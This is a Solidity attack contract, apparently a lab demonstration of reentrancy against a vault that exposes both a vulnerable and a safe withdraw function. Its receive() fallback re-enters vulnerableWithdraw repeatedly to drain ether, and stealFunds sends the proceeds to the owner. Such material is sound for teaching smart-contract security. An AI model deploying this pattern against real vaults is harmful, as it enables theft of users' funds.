//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IYault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GolGThief {
    IYault public targetVault;
    address public owner;
    uint256 public attackCount;
    bool public attackingSafe;

    constructor(address _vaultAddress) {
        targetVault = IYault(_vaultAddress);
        owner = msg.sender;
    }
    
    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only owner can call this function");
        require(msg.value == 1 ether, "Need to have at least 1 ether to attack");
        attackingSafe = false;
        attackCount = 0;
        targetVault.deposit{value: msg.value}();
        targetVault.vulnerableWithdraw();
    }
    
    function attackSafe() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value == 1 ether, "Need at least 1 ether");
        attackingSafe = true;
        attackCount = 0;
        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw();
    }
    
    function stealFunds() external {  
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
    
    function getBalance() external view returns(uint256) { 
        return address(this).balance;
    }
    
    receive() external payable {
        attackCount++;
        if(!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
            targetVault.vulnerableWithdraw();
        }
    }
}
